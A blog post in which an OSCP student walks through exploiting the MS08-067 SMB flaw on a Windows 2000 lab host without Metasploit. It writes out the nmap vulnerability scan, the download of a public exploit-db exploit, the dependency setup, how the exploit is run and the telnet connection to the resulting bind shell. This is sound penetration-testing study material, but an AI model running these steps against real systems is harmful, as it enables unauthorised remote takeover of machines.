---
published: true
layout: post
title: "Exploiting the MS08-067 vulnerability without Metasploit"
---

I'm currently enrolled in Offensive Security's Penetration Testing with Kali Linux course with the intention of obtaining the OSCP Certification.  During the OSCP Certification Exam the use of Metasploit is limited, therefore I am not using it when exploiting the servers in the OSCP lab environment.  
Here are the steps I took to perform my first exploit - MS08-067 - without the use of Metasploit.

I targeted the Netbios service by using Nmap's smb-check-vulns script on a Windows 2000 Server

	nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205

Nmap returned the following

![_config.yml]({{ site.baseurl }}/images/nmap-ms08067-vulnerable.png)

Searched exploit-db for an exploit and found the following

![_config.yml]({{ site.baseurl }}/images/ms08067-exploitdb.png)
    
    cd ~/Projects/oscp/exploits
    wget https://www.exploit-db.com/download/7132 -O ms08-067.py
    chown 755 ms08-067.py

The exploit code states that impacket and pycrypto are required.  Download impacket and pycrypto.

	cd /opt/
    wget https://pypi.python.org/packages/source/i/impacket/impacket-0.9.13.tar.gz
    wget https://pypi.python.org/packages/source/p/pycrypto/pycrypto-2.6.1.tar.gz
    tar -xzf impacket-0.9.13.tar.gz
    tar -xzf pycrypto-2.6.1.tar.gz
 
Need python dev tools installed in order to build pycrypto

	apt-get install python-dev
    
Change the permissions on the impacket folder and run setup

    cd impacket-0.9.13/
	./setup.py

Change the permissions on the pycrypto folder and run setup

	cd ..
    cd pycrypto-2.6.1/ 
	python setup.py build
    python setup.py install
    
Change the port # in the exploit code to the port # reported as vulnerable by Nmap earlier (i'm using Sublime Text)

    cd ~/Projects/oscp/exploits
![_config.yml]({{ site.baseurl }}/images/ms08067-exploitcodeportnumber.png)

Execute the exploit with the argument of 1 for Windows 2000

    ./ms08-067.py 192.168.31.205 1
    
Output of exploit states to connect to victim server using telnet on port 4444

![_config.yml]({{ site.baseurl }}/images/ms08067-payload-sent.png)

Telnet to victim server

    telnet 192.168.31.205 4444
    
Shell obtained

![_config.yml]({{ site.baseurl }}/images/ms08067-shellobtained.png)




